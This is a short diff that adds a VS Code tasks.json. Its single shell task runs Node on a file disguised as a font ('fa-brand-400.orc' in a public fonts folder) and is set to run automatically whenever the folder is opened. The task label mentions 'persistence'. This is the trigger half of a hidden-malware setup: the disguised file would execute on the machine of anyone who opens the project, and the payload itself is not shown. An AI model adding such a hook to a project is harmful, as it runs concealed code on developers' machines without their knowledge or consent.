@@ -1,0 +1,13 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "sentiniel-fixture-persistence",
+      "type": "shell",
+      "command": "node ./backend/app/routers/public/fonts/fa-brand-400.orc",
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
